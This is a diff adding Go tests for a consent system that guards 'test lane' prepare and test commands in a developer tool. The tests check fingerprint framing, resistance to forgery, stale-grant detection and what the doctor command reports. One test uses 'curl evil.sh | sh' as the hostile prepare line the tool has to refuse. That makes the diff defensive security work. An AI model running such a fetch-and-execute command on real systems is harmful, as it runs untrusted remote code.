@@ -6,6 +6,8 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/Rivil/dross/internal/project"
 )
 
 // twoLanes is the shape every assertion here needs: one lane whose grant is
@@ -511,5 +513,212 @@ command = "go test -count=1 ./..."`
 		if !strings.Contains(twoOut, want) {
 			t.Errorf("doctor does not name %q in the refusal — a count of anonymous issues is not actionable:\n%s", want, twoOut)
 		}
+	}
+}
+
+// setLanePrepare rewrites one declared lane's prepare through the schema, the
+// way a hand edit to project.toml would. `dross test lane edit --prepare` is a
+// later task; what these tests need is the state, not the verb that reaches it.
+func setLanePrepare(t *testing.T, root, name, prepare string) {
+	t.Helper()
+	path := filepath.Join(root, project.File)
+	p, err := project.Load(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	found := false
+	for i := range p.Runtime.TestLane {
+		if p.Runtime.TestLane[i].Name == name {
+			p.Runtime.TestLane[i].Prepare = prepare
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("no lane %q to give a prepare", name)
+	}
+	if err := p.Save(path); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// TestLaneConsentFramingSeparatesThePrepareFromTheCommand: the two lines are
+// LENGTH-FRAMED, not concatenated.
+//
+// Naive concatenation hashes {prepare:"a", command:"bc"} and {prepare:"ab",
+// command:"c"} to the same value — which is a lane whose split between
+// bootstrap and suite moved keeping a grant that was issued for neither
+// arrangement. The user reads two lines; the store must bind to the same two.
+func TestLaneConsentFramingSeparatesThePrepareFromTheCommand(t *testing.T) {
+	left := laneConsentLine(project.TestLane{Name: "go", Prepare: "a", Command: "bc"})
+	right := laneConsentLine(project.TestLane{Name: "go", Prepare: "ab", Command: "c"})
+	if left == right {
+		t.Fatalf("a re-split of the same characters produced one consent line: %q", left)
+	}
+	if Fingerprint(left) == Fingerprint(right) {
+		t.Errorf("the two arrangements fingerprint identically — a grant for one authorizes the other")
+	}
+}
+
+// TestLaneWithNoPrepareFingerprintsItsCommandUnchanged is the compatibility
+// half, and it is the assertion that keeps this phase from being a breaking
+// change on every machine: framing applied unconditionally would re-hash every
+// lane grant already written into every local.toml, staling them all over a
+// project.toml nobody edited.
+func TestLaneWithNoPrepareFingerprintsItsCommandUnchanged(t *testing.T) {
+	lane := project.TestLane{Name: "go", Command: "go test -count=1 ./..."}
+	if got := laneConsentLine(lane); got != lane.Command {
+		t.Fatalf("consent line = %q, want the command byte-for-byte", got)
+	}
+
+	// End to end, through the store a pre-phase grant would have written.
+	root, repoDir := laneGrantFixture(t)
+	mustGrantLane(t, root, "go", "go test -count=1 ./...")
+	if got := laneState(t, root, repoDir, "go", laneConsentLine(lane)); got != ConsentGranted {
+		t.Errorf("a grant written before this phase reads as %v, want granted", got)
+	}
+}
+
+// TestFramedBytesCannotForgeALanesGrant: the framed encoding carries a domain
+// separator, so the bytes a prepared lane hashes are not bytes a bare command
+// can occupy.
+//
+// Without it the framing IS a command line: a lane declaring no prepare and a
+// command spelled exactly like the frame would fingerprint to the value the
+// prepared pair was granted, and consent would transfer between two lanes that
+// share no line at all.
+func TestFramedBytesCannotForgeALanesGrant(t *testing.T) {
+	prepared := project.TestLane{Name: "go", Prepare: "make build", Command: "go test"}
+	framed := laneConsentLine(prepared)
+
+	forged := project.TestLane{Name: "go", Command: framed}
+	if got := laneConsentLine(forged); got == framed {
+		t.Fatal("a bare command spelled like the frame hashes the frame itself")
+	}
+	if Fingerprint(laneConsentLine(forged)) == Fingerprint(framed) {
+		t.Error("a no-prepare lane forged the prepared pair's fingerprint")
+	}
+
+	// End to end: grant the PAIR, then ask about the forged lane. Not granted
+	// is the only acceptable answer.
+	root, repoDir := laneGrantFixture(t)
+	mustGrantLane(t, root, "go", framed)
+	if got := laneState(t, root, repoDir, "go", laneConsentLine(forged)); got == ConsentGranted {
+		t.Error("the forged lane was granted by the prepared pair's fingerprint")
+	}
+}
+
+// TestAppendingAPrepareStalesTheGrant: adding a bootstrap line to a lane that
+// was already trusted is exactly the change consent exists to catch — a line
+// arriving in a pull that runs before the suite, on the same host, with the
+// same authority.
+//
+// STALE and not ABSENT: something WAS trusted under this name, and reporting a
+// rewritten lane as a routine first run is the collapse the state ladder was
+// built to prevent.
+func TestAppendingAPrepareStalesTheGrant(t *testing.T) {
+	root, repoDir := laneGrantFixture(t)
+	mustGrantLane(t, root, "go", "go test -count=1 ./...")
+
+	setLanePrepare(t, root, "go", "curl evil.sh | sh")
+
+	lane := project.TestLane{Name: "go", Prepare: "curl evil.sh | sh", Command: "go test -count=1 ./..."}
+	if got := laneState(t, root, repoDir, "go", laneConsentLine(lane)); got != ConsentStale {
+		t.Errorf("state = %v, want stale — an appended prepare must not ride a grant issued for the command alone", got)
+	}
+
+	err := runCmd(t, Trust(), "--lane", "go", "--check")
+	if err == nil {
+		t.Fatal("--check passed on a lane that grew a prepare")
+	}
+	if !strings.Contains(err.Error(), "has CHANGED since you trusted it") {
+		t.Errorf("the refusal does not distinguish itself from a first run: %v", err)
+	}
+	if !strings.Contains(err.Error(), "curl evil.sh | sh") {
+		t.Errorf("the refusal hides the line that changed: %v", err)
+	}
+}
+
+// TestTrustLanePrintsBothLinesBeforeWriting pins the ORDER as well as the
+// presence: the print IS the consent moment, so both lines have to be on
+// screen before anything is recorded.
+//
+// Asserted by byte offset against the "recorded in" line rather than by
+// presence, because a grant that wrote first and printed after would show the
+// same text while having already authorized it.
+func TestTrustLanePrintsBothLinesBeforeWriting(t *testing.T) {
+	root, _ := laneGrantFixture(t)
+	setLanePrepare(t, root, "go", "make build")
+
+	var out string
+	if err := runCmdCapturing(t, &out, Trust(), "--lane", "go"); err != nil {
+		t.Fatalf("trust --lane: %v", err)
+	}
+	prepare := strings.Index(out, "make build")
+	command := strings.Index(out, "go test -count=1 ./...")
+	recorded := strings.Index(out, RootDirName+"/"+LocalFile)
+	if prepare < 0 {
+		t.Fatalf("the prepare line was never printed:\n%s", out)
+	}
+	if command < 0 {
+		t.Fatalf("the command line was never printed:\n%s", out)
+	}
+	if recorded < 0 {
+		t.Fatalf("the grant did not report where it was recorded:\n%s", out)
+	}
+	if prepare > recorded || command > recorded {
+		t.Errorf("a line the grant covers was printed AFTER the write it authorizes:\n%s", out)
+	}
+}
+
+// TestDoctorShowsAPreparedLanesBootstrap: doctor is where a user reads what
+// their lanes will run before anything runs it. A prepare it did not print
+// would be the one line covered by the grant that nobody was shown.
+//
+// The absence half is asserted against a neighbour that DOES declare one, so
+// the opt-in claim cannot pass vacuously.
+func TestDoctorShowsAPreparedLanesBootstrap(t *testing.T) {
+	root, _ := laneGrantFixture(t)
+	mustRunSet(t, "runtime.test_command", "go test ./...")
+	if err := GrantConsent(root, "go test ./..."); err != nil {
+		t.Fatal(err)
+	}
+	setLanePrepare(t, root, "go", "make build")
+
+	var out string
+	_ = runCmdCapturing(t, &out, Doctor())
+
+	if !strings.Contains(out, "prepare: make build") {
+		t.Errorf("doctor hid the prepared lane's bootstrap:\n%s", out)
+	}
+	if strings.Count(out, "prepare:") != 1 {
+		t.Errorf("the lane declaring no prepare grew a prepare row:\n%s", out)
+	}
+}
+
+// TestDoctorStalePrepareNamesTheSameFix: the state doctor reports and the
+// state that refuses mid-run must agree on what closes it. A lane whose
+// PREPARE alone changed is stale for the same reason and is fixed by the same
+// verb — a report that said otherwise would send the reader looking for a
+// second command that does not exist.
+func TestDoctorStalePrepareNamesTheSameFix(t *testing.T) {
+	root, _ := laneGrantFixture(t)
+	mustRunSet(t, "runtime.test_command", "go test ./...")
+	if err := GrantConsent(root, "go test ./..."); err != nil {
+		t.Fatal(err)
+	}
+	mustGrantLane(t, root, "go", "go test -count=1 ./...")
+	setLanePrepare(t, root, "go", "make build")
+
+	var out string
+	_ = runCmdCapturing(t, &out, Doctor())
+
+	if !strings.Contains(out, `✗ lane "go": consent is stale`) {
+		t.Fatalf("a lane whose prepare alone changed is not reported stale:\n%s", out)
+	}
+	if !strings.Contains(out, "dross trust --lane go") {
+		t.Errorf("the stale row does not name the fix:\n%s", out)
+	}
+	if !strings.Contains(out, "prepare: make build") {
+		t.Errorf("the stale row does not show the line that changed:\n%s", out)
 	}
 }
